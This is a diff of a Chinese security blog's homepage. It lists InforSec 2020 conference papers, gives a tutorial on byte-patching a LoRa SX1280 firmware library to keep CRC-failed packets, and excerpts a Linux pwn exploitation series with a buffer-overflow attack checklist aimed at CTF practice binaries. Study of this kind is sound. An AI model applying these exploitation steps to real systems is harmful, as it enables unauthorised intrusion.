@@ -14,18 +14,17 @@
 <meta name="author" content="Gonglong Chen">
 
 
+    
+    
 
-<meta name="description" content="ContactPh.D.,  College of Computer Science, Zhejiang University Email:    desword AT zju.edu.cnPersonal site:    CSDN, Security Blog, github, BiographyGonglong Chen received the PhD degree from the Co">
+
 <meta property="og:type" content="website">
 <meta property="og:title" content="Gonglong Chen">
-<meta property="og:url" content="http://yoursite.com/about/index.html">
+<meta property="og:url" content="http://yoursite.com/index.html">
 <meta property="og:site_name" content="Gonglong Chen">
-<meta property="og:description" content="ContactPh.D.,  College of Computer Science, Zhejiang University Email:    desword AT zju.edu.cnPersonal site:    CSDN, Security Blog, github, BiographyGonglong Chen received the PhD degree from the Co">
 <meta property="og:locale" content="en">
-<meta property="og:updated_time" content="2022-05-10T06:21:56.545Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Gonglong Chen">
-<meta name="twitter:description" content="ContactPh.D.,  College of Computer Science, Zhejiang University Email:    desword AT zju.edu.cnPersonal site:    CSDN, Security Blog, github, BiographyGonglong Chen received the PhD degree from the Co">
 
 <link rel="apple-touch-icon" href="/apple-touch-icon.png">
 
@@ -57,7 +56,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>Gonglong Chen | Gonglong Chen</title>
+<title>Gonglong Chen</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -66,7 +65,7 @@
     var yiliaConfig = {
         fancybox: true,
         animate: false,
-        isHome: false,
+        isHome: true,
         isPost: false,
         isArchive: false,
         isTag: false,
@@ -206,101 +205,986 @@
     </div>
     <link class="menu-list" tags="Tags" friends="Friends" about="About Me">
 </nav>
-      <div class="body-wrap"><article id="<%= post.layout %>-<%= post.slug %>" class="article article-type-<%= post.layout %>" itemscope="" itemprop="blogPost">
-  <%if(post.nodate !="true" ){%="">
+      <div class="body-wrap">
+  
+    <article id="post-inforsec20-day2" class="article article-type-post" itemscope="" itemprop="blogPost">
+  
     <div class="article-meta">
-      <%- partial('post="" date',="" {class_name:="" 'article-date',="" date_format:="" null})="" %="">
-    </%-></div>
-  <%}%>
+      <a href="/2020/01/08/inforsec20-day2/" class="article-date">
+      <time datetime="2020-01-08T12:10:06.000Z" itemprop="datePublished">2020-01-08</time>
+</a>
+
+
+    </div>
+  
   <div class="article-inner">
-    <% if="" (theme.fancybox){="" %="">
+    
       <input type="hidden" class="isFancy">
-    <% }="" %="">
-    <% if="" (post.link="" ||="" post.title){="" %="">
+    
+    
       <header class="article-header">
-        <%- partial('post="" title',="" {class_name:="" 'article-title'})="" %="">
-      </%-></header>
-      <% if="" (!index){="" %="">
-      <div class="article-info article-info-post">
-        <%- partial('post="" category')="" %="">
-        <%- partial('post="" tag')="" %="">
-        <div class="clearfix"></div>
-      </%-></%-></div>
-      <% }="" %="">
-    <% }="" %="">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/01/08/inforsec20-day2/">InforSec 2020 网络空间安全国际学术成果分享（上） Day Two</a>
+    </h1>
+  
+
+      </header>
+      
+    
     <div class="article-entry" itemprop="articleBody">
-      <% if="" (index="" &&="" (post.description="" ||="" post.excerpt)){="" %="">
-          <% if="" (post.description){="" %="">
-              <%- post.description="" %="">
-          <% }="" else="" {="" %="">
-              <%- post.excerpt="" %="">
-          <% }="" %="">
-      <% }="" else="" {="" %="">
-          <% if="" (is_page()){="" %="">
-              <%- partial('_partial="" page')="" %="">
-          <% }="" %="">
-        <%- post.content="" %="">
-      <% }="" %="">
-    </%></%-></%></%-></%></%></%></%-></%></%-></%></%></div>
-    <% if="" (index){="" %="">
+      
+          
+        <p> <img src="https://desword.github.io/image/2020-1-8/infosec20_program.jpg" width="50%" height="50%" align="center"></p>
+<h2 id="Day-2"><a href="#Day-2" class="headerlink" title="Day 2"></a>Day 2</h2><h3 id="上午："><a href="#上午：" class="headerlink" title="上午："></a>上午：</h3><p><a href="https://www.bilibili.com/video/av82577959?p=6" target="_blank" rel="noopener">mopt_更好的变异选择_浙江大学.mp4</a> MOPT: Optimized Mutation Scheduling for Fuzzers <a href="https://desword.github.io/paper/ref/mopt_更好的变异选择_浙江大学.pdf" target="_blank" rel="noopener">pdf</a> USENIX2019<br><a href="https://www.bilibili.com/video/av82577959?p=9" target="_blank" rel="noopener">蒙特卡洛混合式漏洞挖掘_武汉大学.mp4</a> Send Hardest Problems My Way: Probabilistic Path Prioritization for Hybrid Fuzzing <a href="https://desword.github.io/paper/ref/蒙特卡洛混合式漏洞挖掘_武汉大学_ndss19.pdf" target="_blank" rel="noopener">pdf</a> NDSS2019<br><a href="https://www.bilibili.com/video/av82577959?p=2" target="_blank" rel="noopener">EnFuzz_清华.mp4</a> EnFuzz: Ensemble Fuzzing with Seed Synchronization among Diverse Fuzzers <a href="https://desword.github.io/paper/ref/EnFuzz_清华_usenix19.pdf" target="_blank" rel="noopener">pdf</a> USENIX2019<br><a href="https://www.bilibili.com/video/av82577959?p=3" target="_blank" rel="noopener">Firm-AFL_信工所.mp4</a> FIRM-AFL: High-Throughput Greybox Fuzzing of IoT Firmware via Augmented Process Emulation <a href="https://desword.github.io/paper/ref/Firm-AFL_信工所_usenix19.pdf" target="_blank" rel="noopener">pdf</a> USENIX2019<br><a href="https://www.bilibili.com/video/av82577959?p=10" target="_blank" rel="noopener">中文用户口令_南开.mp4</a> Birthday, Name and Bifacial-security: Understanding Passwords of Chinese Web Users <a href="https://desword.github.io/paper/ref/中文用户口令_南开_usenix19.pdf" target="_blank" rel="noopener">pdf</a> USENIX2019</p>
+<h3 id="下午："><a href="#下午：" class="headerlink" title="下午："></a>下午：</h3><p><a href="https://www.bilibili.com/video/av82577959?p=7" target="_blank" rel="noopener">ProFuzzer_人民大学.mp4</a> ProFuzzer: On-the-fly Input Type Probing for Better Zero-day Vulnerability Discovery <a href="https://desword.github.io/paper/ref/ProFuzzer_人民大学_sp19.pdf" target="_blank" rel="noopener">pdf</a> SP2019<br><a href="https://www.bilibili.com/video/av82577959?p=4" target="_blank" rel="noopener">iot移动应用云交互的安全隐患_中科院大学.mp4</a> Discovering and Understanding the Security Hazards in the Interactions between IoT Devices, Mobile Apps, and Clouds on Smart Home Platforms <a href="https://desword.github.io/paper/ref/iot移动应用云交互的安全隐患_中科院大学_usenix19.pdf" target="_blank" rel="noopener">pdf</a> USENIX2019<br><a href="https://www.bilibili.com/video/av82577959?p=5" target="_blank" rel="noopener">KEPLER内核控制流劫持_信工所.mp4</a> KEPLER: Facilitating Control-flow Hijacking Primitive Evaluation for Linux Kernel Vulnerabilities <a href="https://desword.github.io/paper/ref/KEPLER内核控制流劫持_信工所_usenix19.pdf" target="_blank" rel="noopener">pdf</a> USENIX2019<br><a href="https://www.bilibili.com/video/av82577959?p=1" target="_blank" rel="noopener">Bscout软件补丁Java_复旦.mp4</a> BScout: Direct Whole Patch Presence Test 作者主页 USENIX2020</p>
+<p><a href="https://www.bilibili.com/video/av82577959?p=11" target="_blank" rel="noopener">自动漏洞报告分析保护iot设备_信工所.mp4</a> Understanding and Securing Device Vulnerabilities through Automated Bug Report Analysis <a href="https://desword.github.io/paper/ref/自动漏洞报告分析保护iot设备_信工所_sp19.pdf" target="_blank" rel="noopener">pdf</a> SP2019<br><a href="https://www.bilibili.com/video/av82577959?p=8" target="_blank" rel="noopener">SafeHidden进程隔离_清华.mp4</a> SafeHidden: An Efficient and Secure Information Hiding Technique Using Re-randomization <a href="https://desword.github.io/paper/ref/SafeHidden进程隔离_清华_usenix19.pdf" target="_blank" rel="noopener">pdf</a> USENIX2019<br><a href="https://www.bilibili.com/video/av82577959?p=12" target="_blank" rel="noopener">总结发言.mp4</a></p>
+
+      
+    </div>
+    
     <div class="article-info article-info-index">
-      <%if(post.top){%>
-        <div class="article-pop-out tagcloud">
-          <a class="">置顶</a>
-        </div>
-      <% }="" %="">
-      <%- partial('post="" category')="" %="">
-      <%- partial('post="" tag')="" %="">
-      <% if="" (index="" &&="" (post.description="" ||="" post.excerpt)){="" %="">
-        <p class="article-more-link">
-          <a href="<%- url_for(post.path) %>#more"><%= __('index.more')="" %=""> >></%=></a>
-        </p>
-      <% }="" %="">
+      
+      
+
+      
+      
       <div class="clearfix"></div>
-    </%></%></%-></%-></%></%if(post.top){%></div>
-    <% }="" %="">
-  </%></%></%></%></%></%></%></%></div>
-  <% if="" (!index){="" %="">
-    <%- partial('post="" nav')="" %="">
-  <% }="" %="">
-</%></%-></%></%}%></%if(post.nodate></article>
-<%- partial('_partial="" toc')="" %="">
-
-<% if="" (!index="" &&="" theme.share.on="" (post.share="" !="false" ||="" post.share)){="" %="">
-    <%- partial('post="" share')="" %="">
-<% }="" %="">
-
-
-<% if="" (theme.valine_appid="" &&="" theme.valine_appkey){="" %="">
-    <%- partial('post="" valine',="" {="" key:="" post.slug,="" title:="" post.title,="" url:="" config.url+url_for(post.path)="" })="" %="">
-    <% }="" %="">
-
-
-<% if="" (!index="" &&="" post.comments){="" %="">
-    <% if="" (theme.duoshuo.on)="" {="" %="">
-      <%- partial('comments="" duoshuo',="" {="" key:="" post.path,="" title:="" post.title,="" url:="" config.url+url_for(post.path),="" })="" %="">
-    <% }="" else="" if="" (theme.youyan.on)="" {="" %="">
-        <%- partial('comments="" youyan')="" %="">
-    <% }="" else="" if="" (theme.disqus.on)="" {="" %="">
-        <%- partial('comments="" disqus',="" {="" shortname:="" theme.disqus.shortname="" })="" %="">
-    <% }="" else="" if="" (config.disqus_shortname)="" {="" %="">
-        <%- partial('comments="" disqus',="" {="" shortname:="" config.disqus_shortname="" })="" %="">
-    <% }="" %="">
+    </div>
+    
+  </div>
+  
+</article>
 
 
 
-<% }="" %="">
 
-<%- partial('_partial="" post-nav-button')="" %="">
+<!-- for valine comment-->
 
-<% if="" (!index)="" {="" %="">
-    <script>
-        <% if (post.fancybox === false){ %>
-            yiliaConfig.fancybox = false;
-        <% } %>
-    </script>
-<% }="" %="">
-</%></%></%-></%></%></%-></%></%-></%></%-></%></%-></%></%></%></%-></%></%></%-></%></%-></div>
+    <div id="comment"></div>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+new Valine({
+    el: '#comment' ,
+    notify:false, 
+    verify:false, 
+    appId: '5ThDnxJ9xGDRyj5a8Kq8apby-gzGzoHsz',
+    appKey: 'SmwcB7E7gWXRWaBth0Em9cV8',
+    placeholder: "One comment, many ideas.",
+    avatar:"retro"
+});
+</script>
+
+    
+
+
+
+
+
+
+
+
+  
+    <article id="post-infosec-20" class="article article-type-post" itemscope="" itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2020/01/08/infosec-20/" class="article-date">
+      <time datetime="2020-01-08T11:28:24.000Z" itemprop="datePublished">2020-01-08</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/01/08/infosec-20/">InforSec 2020 网络空间安全国际学术成果分享（上） Day One</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p> <img src="https://desword.github.io/image/2020-1-8/infosec20_program.jpg" width="50%" height="50%" align="center"></p>
+<h2 id="Day-1"><a href="#Day-1" class="headerlink" title="Day 1"></a>Day 1</h2><h3 id="上午："><a href="#上午：" class="headerlink" title="上午："></a>上午：</h3><p>SDN 清华 The CrossPath Attack: Disrupting the SDN Control Channel via Shared Links <a href="https://desword.github.io/paper/ref/SDN_清华_usenix19_The CrossPath Attack.pdf" target="_blank" rel="noopener">pdf</a> USENIX2019<br>证书安全 信工所 Certificate Transparency in the Wild: Exploring the Reliability of Monitors 中文介绍 <a href="https://desword.github.io/paper/ref/证书安全_信工所_ccs19.pdf" target="_blank" rel="noopener">pdf</a>  CCS2019<br><a href="https://www.bilibili.com/video/av82531392?p=1" target="_blank" rel="noopener">dns缓存攻击_360.mp4</a> GeekPwn2018  </p>
+<h3 id="下午："><a href="#下午：" class="headerlink" title="下午："></a>下午：</h3><p><a href="https://www.bilibili.com/video/av82531392?p=4" target="_blank" rel="noopener">pex内核权限_浙江大学.mp4</a> PeX: A Permission Check Analysis Framework for Linux Kernel <a href="https://desword.github.io/paper/ref/pex内核权限_浙江大学_usenix19.pdf" target="_blank" rel="noopener">pdf</a> USENIX2019<br><a href="https://www.bilibili.com/video/av82531392?p=5" target="_blank" rel="noopener">SecTEE可信计算_软件所.mp4</a> SecTEE: A Software-based Approach to Secure Enclave Architecture Using TEE <a href="https://desword.github.io/paper/ref/SecTEE可信计算_软件所_ccs19.pdf" target="_blank" rel="noopener">pdf</a> CCS2019<br><a href="https://www.bilibili.com/video/av82531392?p=3" target="_blank" rel="noopener">mesatee联邦学习sgx_百度.mp4</a> Towards Memory Safe Enclave Programming with Rust-SGX<br><a href="https://www.bilibili.com/video/av82531392?p=7" target="_blank" rel="noopener">未初始化漏洞_阿里.mp4</a> Different is Good: Detecting the Use of Uninitialized Variables through Differential Replay <a href="https://desword.github.io/paper/ref/未初始化漏洞_阿里_ccs19.pdf" target="_blank" rel="noopener">pdf</a> CCS2019<br><a href="https://www.bilibili.com/video/av82531392?p=2" target="_blank" rel="noopener">Matryoshka套娃_蚂蚁金服.mp4</a> Matryoshka: fuzzing deeply nested branches <a href="https://desword.github.io/paper/ref/Matryoshka套娃_蚂蚁金服_ccs19.pdf" target="_blank" rel="noopener">pdf</a> CCS2019<br><a href="https://www.bilibili.com/video/av82531392?p=6" target="_blank" rel="noopener">漏洞报告_中科院大学.mp4</a> Towards the Detection of Inconsistencies in Public Security Vulnerability Reports <a href="https://desword.github.io/paper/ref/证书安全_信工所_ccs19.pdf" target="_blank" rel="noopener">pdf</a> USENIX2019<br>圆桌_安全顶会中的那些脑洞大开的idea是怎么来的？<a href="https://www.bilibili.com/video/av82531392?p=8" target="_blank" rel="noopener">mp4</a></p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+<!-- for valine comment-->
+
+    <div id="comment"></div>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+new Valine({
+    el: '#comment' ,
+    notify:false, 
+    verify:false, 
+    appId: '5ThDnxJ9xGDRyj5a8Kq8apby-gzGzoHsz',
+    appKey: 'SmwcB7E7gWXRWaBth0Em9cV8',
+    placeholder: "One comment, many ideas.",
+    avatar:"retro"
+});
+</script>
+
+    
+
+
+
+
+
+
+
+
+  
+    <article id="post-linux-pwn-basic-3" class="article article-type-post" itemscope="" itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2019/10/29/linux-pwn-basic-3/" class="article-date">
+      <time datetime="2019-10-29T06:17:11.000Z" itemprop="datePublished">2019-10-29</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/10/29/linux-pwn-basic-3/">Linux pwn从入门到熟练（三）</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+              <p><img src="https://p1.ssl.qhimg.com/t01749be58aa4e9bc9d.gif" alt=""></p>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Linux pwn系列继续更新。近期终于花了一点时间把自己的坑填上。今天将首先为大家带来上篇文章遗留题目的解答。再次，将介绍两种pwn的方式。这两种pwn都是针对开启了NX保护的程序。其间，还给大家分享了我更新的工具<a href="https://github.com/desword/shellcode_tools" target="_blank" rel="noopener">getOverFlowOffset</a>。<br>该工具经过升级，能够同时应对开启和没有开启PIE的程序。支持分析32位和64位程序。欢迎大家提issue :)。</p>
+<p>“纸上得来终觉浅,绝知此事要躬行”<br>——《冬夜读书示子聿》</p>
+<p>时间久远，怕大家找不到从前的文章，特此给出传送门：<br><a href="https://bbs.pediy.com/thread-248681.htm" target="_blank" rel="noopener">Linux pwn从入门到熟练（二）</a><br><a href="https://bbs.pediy.com/thread-248682.htm" target="_blank" rel="noopener">Linux pwn从入门到熟练</a></p>
+          
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/fake-frame/">fake frame</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/linux-pwn/">linux-pwn</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ret2csu/">ret2csu</a></li></ul>
+    </div>
+
+      
+        <p class="article-more-link">
+          <a href="/2019/10/29/linux-pwn-basic-3/#more">more >></a>
+        </p>
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+<!-- for valine comment-->
+
+    <div id="comment"></div>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+new Valine({
+    el: '#comment' ,
+    notify:false, 
+    verify:false, 
+    appId: '5ThDnxJ9xGDRyj5a8Kq8apby-gzGzoHsz',
+    appKey: 'SmwcB7E7gWXRWaBth0Em9cV8',
+    placeholder: "One comment, many ideas.",
+    avatar:"retro"
+});
+</script>
+
+    
+
+
+
+
+
+
+
+
+  
+    <article id="post-lora-error-packet-modify" class="article article-type-post" itemscope="" itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2019/05/22/lora-error-packet-modify/" class="article-date">
+      <time datetime="2019-05-22T15:31:57.000Z" itemprop="datePublished">2019-05-22</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/05/22/lora-error-packet-modify/">修改某款lora固件库以支持接收错误数据包</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h1 id="LoRa-固件"><a href="#LoRa-固件" class="headerlink" title="LoRa 固件"></a>LoRa 固件</h1><p>目前有一个 需求，为了研究lora 在不同干扰情况下数据包字节错误的情况，我必须将错误的数据包也记录下来，即没有通过CRC校验的数据包。但是现有的lora固件，会直接将没有通过CRC的数据包丢弃，无法查看错误的情况。因此，有了这个记录。</p>
+<h1 id="针对的芯片"><a href="#针对的芯片" class="headerlink" title="针对的芯片"></a>针对的芯片</h1><p>研究的是lora 2.4的通信，因此针对的芯片是sx1280的，这里就不把集成了该芯片的厂商说出来了。下面主要介绍一些思路。<br>整体过程为：</p>
+<ol>
+<li>提取共享库</li>
+<li>结合网上开源的代码，找到关键位置，思考修改的方案</li>
+<li>找到最优的修改方案，执行修改，并重新打包测试。</li>
+</ol>
+<h2 id="提取共享库"><a href="#提取共享库" class="headerlink" title="提取共享库"></a>提取共享库</h2><p>厂商提供的是一个封装起来的LIB库，利用ubuntu 的file工具发现是一个AR格式的打包文件，搜索的解包的方式：（参考<a href="https://www.thegeekstuff.com/2010/08/ar-command-examples/" target="_blank" rel="noopener">AR解压缩</a>）</p>
+<p><img src="https://desword.github.io/image/2019-5-25/1.png" alt=""></p>
+<pre><code>ar x name.lib
+</code></pre><p>修改之后，可以用下面的方式打包回来：</p>
+<pre><code>ar cr dest.lib src1.o src2.o src3.o
+</code></pre><p>其中后面的<strong>src1.o src2.o src3.o</strong>就是共享库。dest.lib是最终打包的文件名。</p>
+<p>之后，我发现其中的sx1280.0的库比较关键，就尝试专注分析该库。<br>还有另外两个厂商提供的封装库，提供了一些MAC层的操作。这里就叫manufactory.o.</p>
+<h2 id="找到关键位置"><a href="#找到关键位置" class="headerlink" title="找到关键位置"></a>找到关键位置</h2><p>我初步分析时，首先尝试分析manufactory.o.里面和MAC消息有关的操作。<br>我分析到两个关键的位置，1，正确接收到lora的消息时的操作</p>
+<pre><code>else if ( a2 &amp; 0x40 ) 
+   clear_event((unsigned __int8)s_phy_layer_task_id, 4);
+    stop_timerEx((unsigned __int8)s_phy_layer_task_id, 4);
+radio_raw_data = (unsigned __int8 *)msg_allocate(255);
+    if ( radio_raw_data )
+    {
+      *(_DWORD *)radio_raw_data_len = 0;
+      SX1280Hal::SetDirDisable((SX1280Hal *)&amp;Radio);
+      clear_event((unsigned __int8)s_phy_layer_task_id, 76);
+      SX1280::GetPayload((SX1280 *)&amp;Radio, radio_raw_data, radio_raw_data_len, 0xFFu);
+      SX1280::GetPacketStatus(&amp;Radio, &amp;PacketStatus);
+      SX1280Hal::SetDirEnable((SX1280Hal *)&amp;Radio);
+     }
+</code></pre><p>可以发现几个关键的步骤就是利用SX1280的库来获取payload并且存储起来。<br>另一个方面，我发现了几个处理lora接收错误情况的流程：</p>
+<pre><code>else if ( !s_PeriodBaseCount_flag )
+        {
+          SetRcMode();
+          send_cmd(9u);               // RX_ERROR_CMD
+        }
+ else if ( a2 &amp; 8 )                            // SAMPLE_MSG_RX_TIMEOUT_EVNT
+  {
+    clear_event((unsigned __int8)s_phy_layer_task_id, 4);
+    stop_timerEx((unsigned __int8)s_phy_layer_task_id, 4);
+    if ( s_tx_confirm_flag == 1 )
+    {
+      s_tx_confirm_flag = 0;
+      v24 = msg_allocate(32);
+      if ( v24 )
+      {
+        *(_BYTE *)v24 = 2;
+        *(_BYTE *)(v24 + 2) = 6;                // MAC_EVENT_TX_TIMEOUT_CMD
+        *(_BYTE *)(v24 + 3) = s_phy_layer_task_id;
+        *(_BYTE *)(v24 + 4) = Radio_packet_type;
+        *(_DWORD *)(v24 + 28) = 0;
+        *(_DWORD *)(v24 + 24) = 0;
+        msg_send((unsigned __int8)g_sample_task_id, v24);
+      }
+    }
+    else
+    {
+      v25 = msg_allocate(32);
+      if ( v25 )
+      {
+        *(_BYTE *)v25 = 2;
+        *(_BYTE *)(v25 + 2) = 9;                // MAC_EVNT_RX_ERROR_CMD
+        *(_BYTE *)(v25 + 3) = s_phy_layer_task_id;
+        *(_BYTE *)(v25 + 4) = Radio_packet_type;
+        *(_DWORD *)(v25 + 28) = 0;
+        *(_DWORD *)(v25 + 24) = 0;
+        msg_send((unsigned __int8)g_sample_task_id, v25);
+      }
+    }
+    result = v4 ^ 8;
+  }
+</code></pre><p>，那么基本的思路，就是在上述所有反馈了lora rx error的地方，仍然将上述SX1280获取和拷贝数据的操作添加在逻辑里面。但是操作起来很复杂，拷贝payload的汇编代码整理一下有这些。而且对于某些条件跳转的地址，还得仔细的修改：</p>
+<pre><code>MOVS    R1, #4
+LDR     R0, =s_phy_layer_task_id
+LDRB    R0, [R0]
+BL      osal_clear_event
+MOVS    R1, #4
+LDR     R0, =s_phy_layer_task_id
+LDRB    R0, [R0]
+BL      osal_stop_timerEx
+MOVS    R0, #0xFF
+BL      osal_msg_allocate
+MOV     R9, R0
+CMP.W   R9, #0
+BEQ     loc_123C
+MOVS    R0, #0
+STR     R0, [SP,#0x28+radio_raw_data_len]
+LDR     R0, =Radio      ; this
+BL      _ZN9SX1280Hal13SetDirDisableEv ; SX1280Hal::SetDirDisable(void)
+MOVS    R1, #0x4C ; &#39;L&#39;
+LDR     R0, =s_phy_layer_task_id
+LDRB    R0, [R0]
+BL      osal_clear_event
+MOVS    R3, #0xFF       ; unsigned __int8
+ADD     R2, SP, #0x28+radio_raw_data_len ; unsigned __int8 *
+MOV     R1, R9          ; unsigned __int8 *
+LDR     R0, =Radio      ; this
+BL      _ZN6SX128010GetPayloadEPhS0_h ; SX1280::GetPayload(uchar *,uchar *,uchar)
+LDR     R1, =PacketStatus
+LDR     R0, =Radio
+BL      _ZN6SX128015GetPacketStatusEP14PacketStatus_t ; SX1280::GetPacketStatus(PacketStatus_t *)
+LDR     R0, =Radio      ; this
+BL      _ZN9SX1280Hal12SetDirEnableEv ; SX1280Hal::SetDirEnable(void)
+</code></pre><p>看到上述都是基于sx1280的操作，那么我想能不能直接在sx1280找到一些突破口。<br>然后发现sx1280的库实现时开源的。<a href="https://os.mbed.com/teams/Semtech/code/SX1280Lib/" target="_blank" rel="noopener">sx1280</a><br>这是非常幸运的。我直接就搜索CRC有关的位置，发现在SX1280::ProcessIrqs( void )的这个函数里面，有这样一个逻辑：</p>
+<pre><code>if( ( irqRegs &amp; IRQ_RX_DONE ) == IRQ_RX_DONE )
+    {
+        if( ( irqRegs &amp; IRQ_CRC_ERROR ) == IRQ_CRC_ERROR )// 如果收到底层CRC不通过的ERROR，就向上层汇报IRQ_CRC_ERROR_CODE。那么MAC层就会根据这个error进行相应的处理，也即是上面看到的丢包处理。理论上，我们只要使得该语句永远为False就会一直跳转到下面的rxDone中，始终汇报数据包接收成功即可。
+        {
+            if( rxError != NULL )
+            {
+                rxError( IRQ_CRC_ERROR_CODE );
+            }
+        }
+        else
+        {
+            if( rxDone != NULL ) //这条基本都会true，因为rxDone是一个指针函数。
+            {
+                rxDone( );
+            }
+        }
+    }
+</code></pre><p>正如代码中分析的，只要if( ( irqRegs &amp; IRQ_CRC_ERROR ) == IRQ_CRC_ERROR )永远为真，那么就可以上报数据包成功接收消息，那么就可以把错误的数据包保留。<br>如果收到底层CRC不通过的ERROR，就向上层汇报IRQ_CRC_ERROR_CODE。那么MAC层就会根据这个error进行相应的处理，也即是上面看到的丢包处理。理论上，我们只要使得该语句永远为False就会一直跳转到下面的rxDone中，始终汇报数据包接收成功即可。</p>
+<h2 id="最优方案的选择，修改测试"><a href="#最优方案的选择，修改测试" class="headerlink" title="最优方案的选择，修改测试"></a>最优方案的选择，修改测试</h2><p>我们发现，直接修改sx1280是最简单的。<br><img src="https://desword.github.io/image/2019-5-25/2.png" alt=""><br>在0x228的代码位置，如果上述比较不等于0才会跳转执行下面的0x238的操作，即rxDone操作。因此，只要将BNE loc_238修改成无条件跳转B loc_238即可。汇编中D1是BNE跳转，E0是无条件跳转即B。因此在对应位置如下修改：<br><img src="https://desword.github.io/image/2019-5-25/3.png" alt=""><br>修改的工具路径是：edit-&gt;patch program-&gt;change byte，（IDA pro 7.0）。<br>修改完之后，再看看程序逻辑已经被修改：<br><img src="https://desword.github.io/image/2019-5-25/4.png" alt=""><br>因此，我们修改一个字节就能够达到效果了。<br>保存修改。edit-&gt;patch program-&gt; apply patched to input file  ，就可以保存修改了。<br>再重新利用AR打包回来，测试效果。<br>发现错误的数据包也可以接受了。</p>
+<p>本文仅供学习交流，如作他用所承受的法律责任一概与作者无关。</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/firmware-reverse/">firmware reverse</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/lora/">lora</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+<!-- for valine comment-->
+
+    <div id="comment"></div>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+new Valine({
+    el: '#comment' ,
+    notify:false, 
+    verify:false, 
+    appId: '5ThDnxJ9xGDRyj5a8Kq8apby-gzGzoHsz',
+    appKey: 'SmwcB7E7gWXRWaBth0Em9cV8',
+    placeholder: "One comment, many ideas.",
+    avatar:"retro"
+});
+</script>
+
+    
+
+
+
+
+
+
+
+
+  
+    <article id="post-linux-pwn-2" class="article article-type-post" itemscope="" itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2018/12/24/linux-pwn-2/" class="article-date">
+      <time datetime="2018-12-23T17:52:19.000Z" itemprop="datePublished">2018-12-24</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/12/24/linux-pwn-2/">Linux pwn从入门到熟练（二）</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>上回说到，如何利用程序中system函数以及bin/sh字符串来进行pwn。这里我们会介绍，如何在栈可执行而system函数以及参数没有的情况下，如何自己布置payload进行pwn。此外，还提供了一份可以参考的pwn套路，套路熟悉了，即可慢慢转化为熟悉。故此名曰：入门到熟练（二）。</p>
+<h1 id="练习题参考（利用库函数读取参数）"><a href="#练习题参考（利用库函数读取参数）" class="headerlink" title="练习题参考（利用库函数读取参数）"></a>练习题参考（利用库函数读取参数）</h1><p>所谓的入门到熟练，套路还是要有的。套路有了，就可以见招拆招。我们一步一步来。<br>拿到题，我们需要依次查看：</p>
+<ol>
+<li>检查保护情况</li>
+<li>判断漏洞函数，如gets,scanf等</li>
+<li>计算目标变量的在堆栈中距离ebp的偏移</li>
+<li>分析是否已经载入了可以利用的函数，如system，execve等</li>
+<li>分析是否有字符串/bin/sh</li>
+</ol>
+<p><a href="https://github.com/desword/pwn_execrise/raw/master/pwn_basic_rop/pwn4" target="_blank" rel="noopener">Pwn4</a>题目地址。</p>
